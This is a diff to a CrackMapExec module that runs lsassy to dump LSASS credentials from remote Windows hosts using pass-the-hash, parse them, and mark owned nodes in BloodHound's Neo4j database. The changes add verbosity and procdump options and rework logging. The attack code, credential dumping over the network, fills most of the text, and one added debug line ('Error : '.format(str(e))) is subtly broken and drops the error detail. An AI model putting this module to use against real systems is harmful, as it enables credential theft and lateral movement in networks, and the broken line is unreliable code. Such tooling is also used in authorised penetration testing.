@@ -22,7 +22,7 @@ class CMEModule:
         """
             METHOD              Method to use to dump procdump with lsassy. See lsassy -h for more details
             REMOTE_LSASS_DUMP   Name of the remote lsass dump (default: Random)
-            PROCDUMP_PATH       Path to procdump on attacker host. If this is not set, "rundll32" method is used
+            PROCDUMP_PATH       Path to procdump on attacker host (Required for method 2)
             BLOODHOUND          Enable Bloodhound integration (default: false)
             NEO4JURI            URI for Neo4j database (default: 127.0.0.1)
             NEO4JPORT           Listeninfg port for Neo4j database (default: 7687)
@@ -86,11 +86,16 @@ class CMEModule:
             domain_name, username, password, host
         )
 
-        command = r"lsassy -j -q --hashes {}:{} '{}'".format(
+        command = r"lsassy -j --hashes {}:{} '{}'".format(
             lmhash,
             nthash,
             py_arg
         )
+
+        if context.verbose:
+            command += " -d "
+        else:
+            command += " -q "
 
         if self.method:
             command += " -m {}".format(self.method)
@@ -98,19 +103,27 @@ class CMEModule:
         if self.remote_lsass_dump:
             command += " --dumpname {}".format(self.remote_lsass_dump)
 
+        if self.procdump_path:
+            command += " --procdump {}".format(self.procdump_path)
+
         # Parsing lsass dump remotely
-        context.log.info('Parsing dump file with lsassy')
+        context.log.info('Parsing lsass with lsassy')
         context.log.debug('Lsassy command : {}'.format(command))
         code, out, err = self.run(command)
+
+        context.log.debug('----- lsassy output -----')
+        for line in out.split("\n"):
+            context.log.debug('{}'.format(line))
+        context.log.debug('-----   end output  -----')
 
         if code != 0:
             # Debug output
             context.log.error('Error while executing lsassy, try using CrackMapExec with --verbose to get more details')
-            context.log.debug('Detailed error : {}'.format(err))
-        else:
-            context.log.debug('----- lsassy output -----')
-            context.log.debug('{}'.format(out))
-            context.log.debug('-----   end output  -----')
+            context.log.debug('----- lsassy error -----')
+            for line in err.split("\n"):
+                context.log.debug('{}'.format(line))
+            context.log.debug('-----   end error  -----')
+        elif not context.verbose:
             self.process_credentials(context, connection, out)
 
     @staticmethod
@@ -172,7 +185,8 @@ class CMEModule:
             context.log.error("Neo4J does not seem to be available on {}. See --options".format(uri))
             sys.exit()
         except Exception as e:
-            context.log.error("Unexpected error : {}".format(e))
+            context.log.error("Unexpected error with Neo4J")
+            context.log.debug("Error : ".format(str(e)))
             sys.exit()
 
         with driver.session() as session:
@@ -205,7 +219,8 @@ class CMEModule:
             context.log.error("Neo4J does not seem to be available on {}. See --options".format(uri))
             return False
         except Exception as e:
-            context.log.error("Unexpected error : {}".format(e))
+            context.log.error("Unexpected error with Neo4J")
+            context.log.debug("Error : ".format(str(e)))
             return False
 
         edges = [
